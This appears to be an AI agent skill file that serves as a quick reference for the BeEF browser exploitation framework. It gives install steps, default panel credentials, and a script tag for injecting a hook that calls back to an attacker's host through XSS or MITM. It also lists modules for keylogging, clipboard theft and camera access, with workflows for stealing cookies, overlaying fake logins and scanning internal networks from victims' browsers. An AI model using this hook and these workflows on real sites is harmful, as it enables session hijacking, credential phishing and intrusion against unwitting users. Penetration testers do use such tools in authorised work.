---
name: beef
description: >
  This skill should be used when the user asks about "beef", "you have XSS on
  a target to pivot into browser-side attacks, session hijacking, and social
  engineering". Browser Exploitation Framework — hook browsers via
  XSS/injected JS and perform client-side attacks.
---

# BeEF (Browser Exploitation Framework)

Hook browsers via XSS and execute client-side attacks from a web console.

## Quick Start

```bash
# Kali
beef-xss

# Or from source
git clone https://github.com/beefproject/beef
cd beef && ./install && ./beef

# Panel: http://127.0.0.1:3000/ui/panel
# Default creds: beef/beef
# Hook URL: http://YOUR_IP:3000/hook.js
```

## Inject Hook

```html
<!-- Inject in XSS payload or MITM response -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

## Key Module Categories

| Category | Examples |
|----------|---------|
| Network | Port scanner, ping sweep, SSRF |
| Browser | Fingerprint, clipboard steal, camera access |
| Social Engineering | Fake login, fake update, clickjacking |
| Exploits | Browser CVEs, Java exploits |
| Persistence | Persistent hook via service worker |
| Misc | Keylogger, screenshot, geolocation |

## Common Workflows

**Steal cookies via hooked browser:**
```
Modules > Browser > Hooked Domain > Get Cookie
```

**Phishing via fake login overlay:**
```
Modules > Social Engineering > Pretty Theft
```

**Port scan internal network from browser:**
```
Modules > Network > Port Scanner
# Set targets: 192.168.1.1-254
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Module list and hook persistence techniques |
